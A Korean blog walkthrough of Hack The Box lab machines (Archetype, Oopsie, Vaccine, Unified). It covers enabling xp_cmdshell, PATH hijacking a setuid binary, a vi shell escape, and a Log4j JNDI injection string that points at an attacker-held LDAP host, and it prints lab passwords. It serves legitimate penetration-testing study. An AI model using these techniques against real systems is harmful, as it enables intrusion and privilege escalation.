---
title: "[HTB] StartingPoint Tier 2- Multi Step Attacks and Privilege Escalation 문제 풀이 모음"
date: 2026-02-19 13:53:00 +09:00
categories: [hacking, Linux, Windows, Very Easy]
tags: [Hack The Box]
---


## 시작에 앞서

이젠 확실하게 권한상승까지 있는 Tier 2 문제를 풀어보자. 근데 어째 권한상승은 할만한데 초기 침투가 좀 많이 어려운...

|이름|난이도|OS|Link|
|:--:|:--:|:--:|:--:|
|**Archetype**|Very Easy|Windows|[Link](https://app.hackthebox.com/machines/Archetype)|
|**Oopsie**|Very Easy|Linux|[Link](https://app.hackthebox.com/machines/Oopsie)|
|**Vaccine**|Very Easy|Linux|[Link](https://app.hackthebox.com/machines/Vaccine)|
|**Responder**|Very Easy|Windows|[Link](https://app.hackthebox.com/machines/Responder)|
|**Unified**|Very Easy|Linux|[Link](https://app.hackthebox.com/machines/Unified)|

아 그리고 이번 문제들을 풀 때에는 설에 내려가서 풀다보니 노트북의 듀얼부팅되어있는 우분투를 이용해 풀었기에 평소랑 좀 달라보이거나 추가적으로 설치해줘야 하는 것들이 많았다.

![startingpoint2](https://github.com/user-attachments/assets/b5b938b8-8e11-4b15-b375-29829062007b)

## Archetype (Windows)

[Congratulations OilLampCat! You are player #116692 to have solved Archetype.](https://labs.hackthebox.com/achievement/machine/988787/287)

![Archetype](https://github.com/user-attachments/assets/11b92d2d-e949-400b-b298-e09a75a74c99)

사실 문제 풀 때에는 Unified 부터 풀기는 했다만 기록하는데에는 문제가 없겠지?

### 정찰 및 정보 수집 (Reconnaissance & Enumeration) 

![nmap1](https://github.com/user-attachments/assets/0896650b-f3df-44fa-8f48-ca19535b70a9)
![nmap2](https://github.com/user-attachments/assets/9bf75d2b-33c3-4224-a56d-b144a55f44ee)

nmap의 결과가 길다보니 두번 잘라 올렸다.

보아하니 `135`,`139`,`445`,`1433` 등의 포트가 열려있고 스캔 결과에 따라 윈도우 머신이라는 것을 알 수 있었다.

![smb1](https://github.com/user-attachments/assets/dc3cd206-94ff-4430-bdc4-125d20146a3a)

smb가 열려있음을 위에서 확인했음으로 접근에 시도해보자.

그 결과 4개의 공유 폴더를 확인할 수 있었다.

![smb2](https://github.com/user-attachments/assets/bccd3f3f-44a3-4f21-b17f-a8416727e9b9)

그렇게 찾아낸 폴더에 접근을 시도하니 `backups`와 `IPC$`에만 접근할 수 있었다.

![smb3](https://github.com/user-attachments/assets/8456b9cb-f7df-47bf-a6a8-804117167aa2)

**backups**에는 `prod.dtsConfig`라는 파일이 있어 get 명령어로 다운받아줬고.

![smb4](https://github.com/user-attachments/assets/42f60502-730b-4dcb-be74-cac5837f5f6c)

**IPC$** 에는 아무런 파일도 존재하지 않았다.

![prod](https://github.com/user-attachments/assets/eb9d74d3-cac8-48dd-8113-fe23635d6c5c)

backups에서 찾아온 `prod.dtsConfig` 파일을 읽어보자 그 안에

- ID=ARCHETYPE\sql_svc
- Password=`생략`

이 존재했다.

### 초기 침투 (Initial Foothold / Exploitation)

![mssqlclient](https://github.com/user-attachments/assets/46d65a5f-1685-4e67-b17e-2d78799f1cc0)

그런데 이 정보를 어디에 사용해야하는걸까?

바로 nmap 스캔 결과에서 나온 1433번 포트의 `ms-sql-s`가 열려있는 것을 확인했었고 리눅스의 mysql, mongodb같은 것이 아니라 microsoft의 sql 서버가 열려있는 것을 확인했기 때문에 접속을 쉽게 해줄 도구인 `mssqlclient.py`를 다운받아 사용하기로 하였다.

![mssql](https://github.com/user-attachments/assets/f553fb8f-dd4e-4a5b-8685-1d72647adc87)

아마 듣기론 원래 kali에는 짤려있었다나? 그리고 지금 내 환경이 ubuntu여서 그렇지 아마 kali를 쓰고있다면 굳이 venv 가상환경을 만들 필요는 없을 것이다.

```bash
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
```

- `ARCHETYPE/sql_svc`: 도메인/사용자명
- `@{TARGET_IP}`: 타겟 머신의 IP 주소
- `-windows-auth` : 윈도우 인증 방식을 사용하겠다는 옵션

위 명령어를 통해 접근을 시도하면 비밀번호를 넣으라 할 것이고 우리가 찾았던 `M3g4c0rp123`를 입력해 서버에 로그인할 수 있다.

![sqladmin check](https://github.com/user-attachments/assets/c50878bf-4217-4ae3-bcdf-60f38a6076cd)

이 서버에서 현제 내 상태가 admin인지 확인을 위해 `SELECT is_srvrolemember('sysadmin');` 를 입력해 결과가 `1`이 나와 SQL 서버의 최고 관리자임을 확인할 수 있었다.

하지만 명령어 실행을 위한 `xp_cmdshell` 명령어를 통해 SQL 쿼리창에서 윈도우 커맨드 쉘(cmd.exe)를 직접 실행하여 `net user` 즉 윈도우 운영체제에 등록된 사용자 계정 목록을 보려 했으나 `blocked(차단)`되어있다며 명령어를 실행시키는데 실패했다.

![sql2](https://github.com/user-attachments/assets/da9d0c0c-d726-49be-aee8-1c78661e67d6)

하지만 난 뭐다? sysadmin이다!

`EXEC sp_configure 'show advanced options', 1;` 명령어를 통해 MSSQL 의 무려 `고급 설정` 옵션을 수정할 수 있도록 허용하고.

`EXEC sp_configure 'xp_cmdshell', 1;` 로 `xp_cmdshell`의 기능을 활성화시킨다. 원래도 켜져있을 수 있지만 이번엔 좀 더 확실히 하려 썼다.

`RECONFIGURE;` 이후 변경한 설정값들을 시스템에 적용하는 명령어를 통해 이제 진짜 명령어 사용이 가능해졌다.

그렇게 `whoami` 명령어를 입력하였을 때 `archetype\sql_svc`가 뜨는 것을 확인할 수 있었다.

![sql3](https://github.com/user-attachments/assets/7eacfb5f-40f5-4dfa-9d55-c980d125cf6a)

이제 리버스 쉘을 걸어줘야 하는데 리눅스에서 하던 것 처럼이 아니라 윈도우용 Netcat인 `nc64.exe`를 직접 넘겨줘 리버스 쉘을 걸어주자.

고로 github에서 nc64.exe를 다운받고 그 위치에서 파이썬 서버를 열어둔 뒤 SQL 서버에서 wget 명령어로 nc64.exe를 가져온 뒤 powershell을 이용해 내쪽으로 연결을 시도하자.

~~이 때 tmux를 썼는데 설정을 kali처럼 하고 싶었으나 실패해서 저런 화면이 되었다. 왜 내 우분투는 kali처럼 tmux를 열 수가 없숴. 난 그저 ctrl+R로 화면을 쪼개고 싶었을 뿐이야~~

![after reverse](https://github.com/user-attachments/assets/476f8d43-4d45-4544-ad79-b6c05891f661)

위 과정을 통해 윈도우의 powershell을 받아냈다면 이제 플래그를 찾아보자.

![get user](https://github.com/user-attachments/assets/35936d25-1abd-4d06-8b75-39810cf90f3d)

근데 국룰로 HTB의 윈도우 userflag는 `Desktop`에 있다.

아닌적도 있긴 했지만.

### 권한 상승 (Privilege Escalation) 

![winpeas](https://github.com/user-attachments/assets/905323ae-d754-43b4-bc37-1d214de72918)

이제 오랜만에 윈도우에서 권한 상승을 하는데 하나하나 찾아볼 수는 없으니? `winpeas`를 이용하도록 하자.

설치를 위해 다시 내 폴더에 winpeas를 다운받고 wget으로 받아주면 된다.

![winpeas2](https://github.com/user-attachments/assets/c8015f5a-55d3-4c91-9a81-49845ef822e9)

설치가 잘 되었는지를 확인해보고

![winpeas3](https://github.com/user-attachments/assets/e6e680b8-2596-423a-a320-ecfd0e130173)

winpeas를 실행시켜주면? 뭐 가상머신이라던가 시스템에 대한 여러 정보가 나오고,

![winpeas4](https://github.com/user-attachments/assets/a3a5db34-c7b8-43ea-a0cc-773aa8e8f9c1)

자동으로 수 많은 취약점들이 쭈루룩 나오는데...

사실 다른 문제였다면 이걸 쓰겠다만.

![winpeas5](https://github.com/user-attachments/assets/7faaf16a-27eb-4d1a-a526-db38220b27a4)

진짜 긴데 그 와중에 빨간색으로 윈도우 파일중에 `ConsoleHost_history.txt`라고 하는 뭔가 뭔가인 파일도 보였다.

![winpeas6](https://github.com/user-attachments/assets/38726a3c-2662-4bc6-8024-edfe02b9e7ff)

그래서 다른 취약점들을 사용해보기 전에 한번 이 파일을 열어봤는데.

> 참고로 윈도우에선 파일 읽을 때 cat이 아니라 type 명령어를 써야한다.

어라? `net.exe`를 통해 윈도우에서 네트워크 공유 자원(Shared Folder)을 드라이브에 연결하여 사용하는 것을 확인했다. 심지어 그 때에 계정이 `administrator`였고 비밀번호는 `MEGACORP_4dm1n!!`였다고 한다.

평문으로 최고 관리자의 비밀번호가 적혀있던 취약점이였다. 바로 **자격 증명 유출(Credential Leak)**.

![psexec](https://github.com/user-attachments/assets/1b37ea54-2186-4ae5-841b-eee1921cb8ba)

그리고 이 유출된 결과를 이용해 권한 상승된 쉘을 획득하기 위하여 `psexec.py`를 사용했는데, 지금까지 보지 못했던 생소한 친구라 간단히 어떻게 진행된 것인지 설명해보자면.

1. **연결 시도** : `python3 psexec.py administrator@10.129.95.187` 를 통해 연결을 시도하면 `ADMIN$` 공유폴더에서 쓰기가 가능한지 확인한다.
2. **파일 업로드** : 임의의 이름을 가진 실행파일을 타겟 시스템에 업로드 한다.
3. **서비스 생성 및 시작** : `SVCManger`를 통해 업로드한 파일을 서비스로 등록해 실행한다.
4. **쉘 획득** : 서비스가 실행되면 공격자의 터미널로 최고 권한의 쉘이 연결된다.

근데 난 이게 리버스쉘을 받아온 것인줄 알았는데 `psexec`이 만드는 파일은 윈도우 시스템에 의해 관리되는 서비스 계정(nt authority\system) 권한으로 실행되기에 관리자 권한을 얻을 수 있는 것이라고 한다. 으음... 어려운 것이여..

게다가 굳이 `ADMIN$` 폴더인 이유는 원래는 윈도우 설치 디렉토리를 가리키는 `숨겨진 관리용 공유 폴더`라고 한다. 그렇기에 여기에 파일을 올리고 실행하려면 이미 관리자 권한이 필요하다는 것이므로 여기에 실행 파일을 올려서 우리에게 SYSTEM 쉘을 제공하는 것이다.

[정순봉의 스마트 라이프/공유폴더 관리하기 II - 관리 목적 공유 폴더](https://blog.naver.com/itexpert2007/30074080615)를 참고하면 좋겠다.

[IPC\$와 ADMIN$은 원격 공유 폴더로 표시되며 관리자 액세스 권한이 부여됩니다.](https://learn.microsoft.com/en-us/answers/questions/4070770/ipc-and-admin-appear-as-remote-shared-folders-and) 이제 요번 문제를 풀었다면 요건 딱히 문제가 안된다는걸 알겠죠? 보이다고 해도 결국엔 정찰 할 때에 봤듯 접속을 못하니까요.

![get rootflag](https://github.com/user-attachments/assets/5528e701-3b0c-4cd5-a71e-0dbd27ae868c)

그리고 여기도 user.flag와 동일하게 `Administrator\Desktop`에 root.flag가 있다.

![pwned](https://github.com/user-attachments/assets/1274fd6f-7ee1-4933-944a-a0a386480600)

## Oopsie (Linux)

[Congratulations OilLampCat! You are player #84803 to have solved Oopsie.](https://labs.hackthebox.com/achievement/machine/988787/288)

![Oopsie](https://github.com/user-attachments/assets/f1d277eb-ccd7-4c58-a409-73e1327d116a)

이번 문제는 Oopsie라는 Linux 문제로 다른 문제들에 비해선 확실히 좀 더 쉬웠다.

### 정찰 및 정보 수집 (Reconnaissance & Enumeration)

![nmap](https://github.com/user-attachments/assets/4c89ffb1-2700-4faa-a1ae-c3a84c326993)

nmap 결과 22번의 ssh와 80번에 http 서버가 열려있었다.

![web1](https://github.com/user-attachments/assets/f4295143-9a7e-4cdd-97d0-728d0b82fa32)

메인 페이지는 이렇게 되어있었고

![web2](https://github.com/user-attachments/assets/529e45b0-89f6-4655-a93b-5728cbcae646)

![web3](https://github.com/user-attachments/assets/896a588f-ad89-490f-bfc4-c750ec71d4e0)

오른쪽 위 `Services`나 `About`, `Contact`를 눌러도 메인 페이지에서 위 아래로 움직이기만 할 뿐 따로 연결되는 곳은 없었다.

![dirsearch](https://github.com/user-attachments/assets/8418e5e0-98a4-4c32-9395-cd81ad8abfbf)

![gobuster](https://github.com/user-attachments/assets/851fb589-4532-4137-8912-5f75aac0a8a0)

그렇기에 `dirsearch`와 `gobuster`를 이용해 스캔을 진행해보았으나... 여전히 뭐.. 접근하거나 볼만한 것이 없었다.

![burpsuite](https://github.com/user-attachments/assets/d4d7abcd-a618-49ae-b7c8-70be86853ce0)

그렇기에 `burpsuite`로 넘어와 페이지에 접속해보니. 웹사이트에 접속할 때 브라우저가 보이는게 아니라 뒤에서 자동으로 요청하는 리소스를 `Burp`가 `패시브 스파이더링(Passive Spidering)`을 통해 자동으로 웹사이트의 구조를 잡아 매핑해주게 된다.

그리고 이 때 `/cdn-cgi/login/script.js`라는 로그인 폴더를 확인 할 수 있었다.

![web4](https://github.com/user-attachments/assets/2fc12558-3fb5-495c-adb0-d08a2d070255)

로그인 페이지에 접속하니 일단 게스트로써 로그인 할 수 있었다.

![web5](https://github.com/user-attachments/assets/dbf8289f-83a9-428f-b75b-dcfb6130457b)

바로 보이는건 MegaCorp Automotive 라는 회사의 사이트? 였는데

![web6](https://github.com/user-attachments/assets/493b0437-9f8a-4d2e-893e-405c26259b2c)

둘러보니 현재 로그인한 나의 정보와

![web7](https://github.com/user-attachments/assets/8686f346-cdac-40e1-8934-2ecdce3897ef)

등록되어있는 차 번호와 가격?

![web8](https://github.com/user-attachments/assets/f7b93c30-cdb8-4bb7-8596-ac2c7f5dc6ff)

그리고 고객의 정보가 쓰여있었다.

사실 여기서도 일반 회사였다면 고객 정보가 유출되는거니 문제가 생기지 않을까.. 생각도 했다만 일단 내 목표는 아니니까.

![web9](https://github.com/user-attachments/assets/0d58fc8f-c54b-4f72-abec-683acf1224a0)

그런데 `Uploads`에서는 내가 admin 계정이 아니므로 할 수 있는 작업이 없다고 한다.

흠... 요게 타겟인가?

### 초기 침투 (Initial Foothold / Exploitation)

사실 이미 초기 침투가 시작된 거라고 봐야할지 아니면 위 과정 까지는 정보 수집이라고 보아야할지 모르겠다.

![url 변조](https://github.com/user-attachments/assets/68ed6c76-2ff5-4040-9ab4-f5866abddba7)

다시 Account 페이지로 돌아와 설마 혹시 url의 `id=2` 부분을 변조시켜버리면 다른 계정이 나오지 않을까 하는 생각에 1로 바꿔봤더니 위 사진처럼 admin 계정의 AccessID를 찾아낼 수 있었다.

![burp admin](https://github.com/user-attachments/assets/6554bb53-d9e6-4df5-8af5-91007e8730f9)

그래서 아까 접속할 수 없었던 Uploads 페이지에 접속을 시도하며 중간에 쿠키 값을 관리자의 것으로 바꿔치기 했다.

![upload able](https://github.com/user-attachments/assets/13aaffea-2a41-4c5f-b729-9505af2d364e)

그러자 이제 업로드 페이지가 보이기 시작했다. 

![php](https://github.com/user-attachments/assets/bd2d1196-0358-4c4c-b034-6050596ee2ef)

`Wappalyzer`를 통해 PHP로 사이트가 만들어졌다는 것을 알게되었으니 리버스쉘을 업로드 할 때에 PHP로 만들면 되겠다.

![rsg](https://github.com/user-attachments/assets/93749f48-4468-4d9b-8b70-0e63364a7a91)

그리고 직접 코드를 작성해도 당연히 좋지만 난 이번엔 `Reverse Shell Generator`를 이용해보기로 했다.

[Reverse Shell Generator](https://www.revshells.com/)

![upload php](https://github.com/user-attachments/assets/f5d16575-6af7-42ef-83db-fffff7f862b7)

위처럼 페이로드를 다운받은 후 이름과 함께 업로드 하게 되면?

![not working](https://github.com/user-attachments/assets/5dd45157-6597-482a-a699-e7cd39d07558)

안된다. 이유는?

![upload burp](https://github.com/user-attachments/assets/398c025e-8c91-4494-9d6f-56b8e0fbe4c1)

페이로드를 업로드 할 때에도 쿠키를 위조해줘야 하기 때문이다. 이런.

분명 쿠키 위조를 자동으로 하는 방법이 있기는 할텐데 일단 난 간단하게 burp를 이용했다.

![upload](https://github.com/user-attachments/assets/57ed94c4-dbde-4172-9c40-42d5146ef673)

이제야 제대로 페이로드가 올라가게 되었고.

다시 dirsearch나 gobuster를 이용해 찾은 것 중 하나인 `http://{IP번호}/uploads/{파일 이름}`에 접속하면?

![RS](https://github.com/user-attachments/assets/9c9687d7-2cf9-4426-a120-953eb91c5805)

이렇게 리버스 쉘을 받을 수 있게 된다! 

게다가 python이 있어 더 보기 편하게 만들기도 가능!

![get user](https://github.com/user-attachments/assets/79921093-6958-487f-8dee-1b1e55ba0afa)

갑자기 이미지가 확 커져버렸는데 `rober`라는 유저에게 가서 `user.txt`를 얻어냈다는 내용이다.

### 권한 상승 (Privilege Escalation) 

![PE](https://github.com/user-attachments/assets/93366c7a-8c1b-45eb-82b3-41d26ac0f9da)

그럼 이제 권한 상승을 진행해야하는데 바로 `sudo -l`을 하기엔 일반 계정도 아니고 해서 좀 더 파일을 살펴보니 웹 페이지에서 로그인 하는 `cdn-cgi/login` 안에 admin 계정과 비밀번호 `MEGACORP_4dm1n!!`이 있었다.

만... 요녀석은 진짜 웹 사이트 로그인을 관리자 계정으로 하는 친구고,

![PE2](https://github.com/user-attachments/assets/eb5ad027-2735-48cf-b5b1-3b322209d0af)

좀 더 둘러보다 `db.php` 파일 안에 `mysql` 접속을 위한 `robert`라는 계정의 `M3g4C0rpUs3r!` 이라는 비밀번호를 발견할 수 있었다.

그래서 바로 `su robert`를 통해 robert 유저의 계정을 획득할 수 있었다.

![sudol](https://github.com/user-attachments/assets/9503682a-2a04-4c8f-8ace-e429fb44a2c2)

하지만 평소에 하던 `sudo -l`을 하자니 어째 불가능하다는 응답을 얻었고 그럼 뭘 내가 할 수 있지? 하는 생각에 `id`를 쳐보니 **groups**에 `1001(bugtracker)`라는 그룹을 발견할 수 있었다.

![findgroup](https://github.com/user-attachments/assets/23308bd3-02d0-4624-82e7-3befcc23beac)

그래서 바~로 이 그룹이 뭔 파일을 다루고 있나 검색해 보았고 그 결과 `/usr/bin/bugtracker`를 찾아냈다.

![bugtracker](https://github.com/user-attachments/assets/e674fc35-9119-4098-a16a-c8fcdf6311a1)

요게 뭔지 ls와 file 명령어를 통해 권한이 `-rwsr-xr--`로 설정되어있어 파일 소유자가 `root`라는 것을 확인할 수 있었다!!

![bugracker2](https://github.com/user-attachments/assets/536e66db-3982-48d8-be08-b53297b52187)

직접 실행해보니 `Bug ID`를 입력하라고 나오는데 난 모르죠?

![bt3](https://github.com/user-attachments/assets/c811fd58-2e8f-48ce-831f-7068d69e8bb3)

그래서 아무거나 입력해보니 cat 명령어를 통해 파일을 읽어 그런거 없다고 알려준다.

근데 이거 관리자 권한으로 실행되고 cat 명령어를 쓰네? 근데 `/bin/cat`이 아니라 그냥 cat이네? `Path Hijacking`?

![PH](https://github.com/user-attachments/assets/5b4b6eaa-5a23-4d82-9b28-917991885006)

정말 Path Hijacking이 맞는지 확인을 위해 `/tmp` 폴더에 가짜 `cat`을 만들어 그 안에 특별히 추가할 것도 없이 `/bin/sh` 그냥 쉘 불러오는 명령어를 넣은 후,

![PH2](https://github.com/user-attachments/assets/ad4450e7-e7bb-46d8-8adf-ea3b29dbe310)

PATH 즉 확경변수에 `/tmp`를 등록해주고 다시 Bug Tracker를 실행시켜주면?

root 권한을 얻을 수 있다.

![get...root](https://github.com/user-attachments/assets/7b0d0550-c034-41a3-831f-0d68d7c70911)

그리고 root.txt를 읽으려는 순간? 갑자기 내가 다시 robert가 되네?

![아참](https://github.com/user-attachments/assets/db409cfb-9a84-40b5-b8ea-02b9ed9a0254)

아 참 맞다 cat을 우리의 권한 상승하는 친구로 바꿔둬서 그랬던 거였다. 다시 환경변수를 리셋해주고 cat을 이용해 플래그를 읽어주자.

![Oopsie done](https://github.com/user-attachments/assets/14dc0efc-88a1-45f3-a221-7a7e71ddcd04)

끝!

## Vaccine (Linux)

![Vaccine](https://github.com/user-attachments/assets/21e93010-24ba-4c93-8aae-fa820e390c89)

[Congratulations OilLampCat! You are player #69929 to have solved Vaccine.](https://labs.hackthebox.com/achievement/machine/988787/289)

### 정찰 및 정보 수집 (Reconnaissance & Enumeration) 

![nmap1](https://github.com/user-attachments/assets/2e81b55f-3c67-4b08-85d5-44c677fe76e0)

![nmap2](https://github.com/user-attachments/assets/dff213ba-9b0f-4d95-ad31-3977a3d7e084)

이번에도 동일하게 nmap으로 먼저 스캔을 진행했고 그 결과 `21`번 포트에서 `ftp`, `22`번 포트에 `ssh`, `80`번 포트에 `http` 가 열려있음을 확인했는데... 

이상한 `1122`, `1455`, `4125` 등의 포트도 뭔가 감지된 듯 하긴 한데 딱히? 싶어서 일단 바로 사이트부터 접속해보기로 했다.

![web](https://github.com/user-attachments/assets/a524f250-8443-4cb9-a740-4d662a185137)

로그인 페이지로 연결되었는데 진짜 로그인만 떡하니 있고 뭐 할 수 있는게 없어보였다. 필요하다면 dir brute forcing이라도 해봐야겠지?

### 초기 침투 (Initial Foothold / Exploitation)


![ftp](https://github.com/user-attachments/assets/e025f73b-78d8-4223-a1d1-d4342ae7fba2)

그러나 nmap 결과에서 ftp 서비스는 anonymous로 접속 가능하다고 했고 거기엔 backup.zip이 있다고 했으니 받아오자.

![z2j](https://github.com/user-attachments/assets/03770b59-a183-44a1-a9f0-c2c60dc50509)

근데 압축 파일이 또 비밀번호가 걸려있었기에 `zip2john`을 이용해 john the ripper를 돌리기 위한 해시를 만들고

![john](https://github.com/user-attachments/assets/1d7111ea-037e-4dd9-a1a6-785109f38764)

john을 이용해 rockyou 워드리스트를 통해 `741852963`이 비밀번호임을 찾아냈다.

![inside](https://github.com/user-attachments/assets/61c80d89-4701-4308-9126-14659350d8f2)

그 안에는 위와같이 `index.php`와 `style.css`가 있었다.

![crack](https://github.com/user-attachments/assets/ff02ad0d-5f90-462c-9aa6-d82a6b02ba7d)

그리고 index.php안에 해시로 된 비밀번호가 있었는데.... 내가 요걸 안 찍어놨다...

만약 시험중에 이러면 보고서에서 바로 감점을 당하게 될테니 주의...

![web login](https://github.com/user-attachments/assets/801e3b05-f7fc-4bb9-a8d9-ecf2b176c78d)

웹 로그인에 성공하니 이번에도 Megacorp의 차 리스트?가 나온다.

![검색](https://github.com/user-attachments/assets/3b2d5f7b-cd91-42f1-99c3-f0d3cbda9350)

그리고 보아하니 검색을 하면 url로 넘어가는 듯 보이고. 그렇기에 혹시 SQL 인젝션 공격이 가능할까 싶은데...

![로그인쿠키](https://github.com/user-attachments/assets/c4fbd062-a25e-4e9a-a147-796667c8819b)

일단은 로그인을 한 상황이기 떄문에 쿠키에서 PHPSSID 값을 꺼내주자.

![sqlmap](https://github.com/user-attachments/assets/c176a7fd-23f3-447e-ab8b-3cf2de587e7a)

직접 하자기엔 오래 걸리기도 하고 내가 놓치는 부분이 있을 수도 있으니 `SQLmap`을 이용해 자동으로 sqli를 진행하자. 

![did](https://github.com/user-attachments/assets/d9defdea-e486-4c67-a156-44b32fae2c6c)

알아서 뭔가 막 하다가 내게 `os-shell>`이라며 쉘을 던져주었다.

![rev](https://github.com/user-attachments/assets/e2daac3a-67e5-431d-8137-e480ddf8a204)

그리고 이 상태로는 혹시 모를 사태나 사용자 등을 좀 더 보기 편하게 하기 위해 리버스쉘을 걸어 내 쉘로 받아오자.

참고로 내 우분투에서는 uwf가 켜져있어 리버스 쉘을 못받았기에 잠시 disable로 꺼주었다.

~~요거땜시 꽤 오래 시달렸다는 것은 안 비밀~~

![userflag](https://github.com/user-attachments/assets/90c62f71-5342-4101-b77e-caa45773ec05)

바로 user.txt를 찾을 수 있다.

### 권한 상승 (Privilege Escalation) 

![sudol](https://github.com/user-attachments/assets/c472421c-6735-48d5-b384-d3620d0097c1)

이 때 `sudo -l`로 가능한 취약점을 찾으려 했으나 비밀번호가 걸려있어서 실패했다.

![get](https://github.com/user-attachments/assets/272a462e-ecc2-4294-8084-9aa71a2ed83f)

그래서 파일을 뒤젹거리며 돌아다니다 `/var/www/html`의 `dashboard.php`에서

![pass](https://github.com/user-attachments/assets/189128b8-0ade-487b-a97d-362a27a12c57)

`postrgres` 유저의 비밀번호를 발견할 수 있었다.

![ssh](https://github.com/user-attachments/assets/40bf5ba2-83c8-4cc2-97ac-270528bf7bd0)

애초에 지금은 리버스 쉘 상태이기도 하니까 아예 비밀번호도 얻은 겸 ssh로 접속했다.

![sudol2](https://github.com/user-attachments/assets/676e0da2-7326-4eb3-82f4-3fa21b63790b)

이번에는 비밀번호를 넣어 `sudo -l`을 성공했고, `/bin/vi`가 `/etc/postgresql/11/main/pg_hba.conf` 파일에 대해 루트 편집 권한이 있다고 한다.

![conf](https://github.com/user-attachments/assets/f1f862a0-a0f9-48c6-a081-9423bd17a38c)

![conf2](https://github.com/user-attachments/assets/98aa4d0a-2e9c-400b-87fb-03a2b5e7b0ac)

사실 파일 자체에는 딱히 내용이 없고,

![vi](https://github.com/user-attachments/assets/d3d25f64-e5d0-4850-a345-3f6eeac56b47)

sudo 권한으로 vi 편집기를 통해 열고,

![vi2](https://github.com/user-attachments/assets/6767c8a8-d436-4aed-b3d9-fdcb5ce27fe6)

`:shell`을 입력해 vi 에디터에서 시스템 쉘로 빠져나가자.

![root](https://github.com/user-attachments/assets/e90339ec-1860-46be-a6cb-938fb9fec3a9)

그러면 이렇게 루트 권한을 획득할 수 있다!

![get root](https://github.com/user-attachments/assets/c1ba9eab-5b2c-477b-96f1-f8f1071e586e)

루트 플래그는 `/root`안에 있었다.

![get Vaccine](https://github.com/user-attachments/assets/6519c627-b927-490d-b0d6-471954a06de6)


## Unified (Linux)

![Unified](https://github.com/user-attachments/assets/329fe6f4-5da7-42a4-a0e0-61f1bede31c9)

[Congratulations OilLampCat! You are player #42116 to have solved Unified.](https://labs.hackthebox.com/achievement/machine/988787/441)

대망의 Starting Point 시리즈 마지막 문제!

그리고 사실상 가장 처음에 풀었는데 가장 어려웠던 문제!

### 정찰 및 정보 수집 (Reconnaissance & Enumeration) 

![nmap1](https://github.com/user-attachments/assets/e410f36c-a542-461a-ad8b-eba3170c6c7a)

![nmap2](https://github.com/user-attachments/assets/e9efda72-9bb7-4d31-b0c5-c5365659dec4)

![nmap3](https://github.com/user-attachments/assets/0aab16b4-3631-4f0d-b48f-4a7b0d54f583)


nmap으로 시작! 근데 이번에는 `22`, `6789?`, `8080`, `8443`번 포트가 열려있다.

심지어 엄청 긴 결과가 나오는데...

![nmap3](https://github.com/user-attachments/assets/7aeb6d56-53ed-425b-b385-7a0910d40d45)

좀 더 간단히 보자면 위와 같다.

![web](https://github.com/user-attachments/assets/4984478d-bc8f-49d3-bf29-729ad0b7fd90)

웹사이트에 접속해보니 바로 `UniFi`의 로그인 페이지로 보내버린다.

![버전](https://github.com/user-attachments/assets/156522be-921d-40c4-8f95-41334a9fdf3a)

일단 버전이 나오니 버전에 대하여 검색해보면 unifi에 대한 취약점이 아니라 `Log4j`에 대한 이야기가 나온다.

unifi의 내부에서 돌아가는 Log4j에 취약점이 있었던 것! 게다가 CVE-2021-44228 이라고 누가 만들어뒀다.

![CVE](https://github.com/user-attachments/assets/626d9770-f0d7-4ca5-a452-dfc92169e207)

CVE 정보를 보니 LDAP 서버를 열고 해야한다는데...

![블로그1](https://github.com/user-attachments/assets/8719a87d-ba4e-400c-801c-8fa28e84d5a2)

![블로그2](https://github.com/user-attachments/assets/3ec6d165-89c9-4a21-988f-9a2ccadd56a2)

이게 POC를 이용해보려 해도 원.. docker에 올리고 뭔갈 해야하는데 좀 많이 복잡해보여서 아예 위 두 블로그를 읽으며 학습의 시간을 가졌다.

[Log4j 보안 취약점 사태](https://namu.wiki/w/Log4j%20%EB%B3%B4%EC%95%88%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%82%AC%ED%83%9C)

보아하니 이거 아예 나무위키에도 올라와있네?

![github](https://github.com/user-attachments/assets/35509cff-9d3b-4fdb-b053-403e2a77210b)

게다가 unifi에 대한 github이 올라와있기도 하다.

### 초기 침투 (Initial Foothold / Exploitation)

![jdk](https://github.com/user-attachments/assets/50486439-b5b3-4c7c-8dc9-ffee474dc4be)
![maven](https://github.com/user-attachments/assets/6c98717c-63fc-4a15-bec7-9c0049f5453e)
![rogue-jndi](https://github.com/user-attachments/assets/a72c4fee-b866-4ca8-8578-b0b4cd629d5d)
![rogue 이어서](https://github.com/user-attachments/assets/3682a272-2eef-4352-9808-145ff39765a7)

일단 아까 CVE에 대해 읽어보았을 때에 LDAP 서버를 구축해야한다고 했었다.

CVE에서 말하길 

Java에는 **JNDI(Java Naming and Directory Interface)** 라는 기능이 있다. 이건 자바 애플리케이션이 `외부 데이터나 자원을 이름으로 찾아서 가져올 수 있게` 해주는 인터페이스인데.

이 때 `Log4j`는 로그를 남기는 라이브러리이고 이 친구는 로그 메시지 안에 `변수`가 있으면 그걸 해석해서 실제 값으로 바꿔주는 기능을 갖고 있다만 너무 똑똑했다.

Log4j가 JNDI 조회 구문인 `${jndi:ldap://}` 까지 해석해 실행해버린다는 것이다. 다르게 말하면 예외처리가 안 되어있던거다.

그래서 우리는 이 헤더에 `${jndi:ldap://공격자IP:1389/o=tomcat}` 명령어를 흘려넣어 악성 페이로드를 가져가게 할 생각이다.

그리고 이를 도와줄, 그것도 LDAP 서버를 쉽게 구축하도록 도와줄 친구가 바로 `rogue-jndi`이다.

여기서 잠시 왜 `/o=tomcat`이 명령어에 들어갔는지 보자면 `UniFi`는 내부에서 Apache Tomcat 이라는 웹 애플리케이션이 돌아가고 있고 그렇기에 가장 확실한 무기가 `tomcat`이기 때문에 이 명령어가 들어갔다고 볼 수 있다.

간단히 정리하면 위 명령어는 "내 서버에 접속해서, 내가 준비한 Tomcat 환경용 무기 (`/o=tomcat`)을 가져가 실행해라!" 라고 볼 수 있겠다.

이게 진짜 어떻게 왜 `Very Easy?` WHY?

![설](https://github.com/user-attachments/assets/7ea5b155-1f11-4f6d-9ca2-29a252c3ba01)

rogue-jndi의 설치가 끝나면 target이라는 폴더가 있는데,

![페이로드](https://github.com/user-attachments/assets/536cbbc4-97cd-4231-af0f-e0fce3fa49fc)

그 안에 들어가 리버스쉘 페이로드를 준비해두자. 혹시 몰라서 base64로 만들었다.

![ldap](https://github.com/user-attachments/assets/f6683803-325d-4207-96f3-a40fc9ee98af)

그리고 위 명령어를 통해 명령어도 넘겨주며 ldap 서버를 켜두고,

![리버스](https://github.com/user-attachments/assets/d08f6514-b5ce-4b30-9eb8-6b752b162841)

리버스 쉘로 받을 준비도 완료!

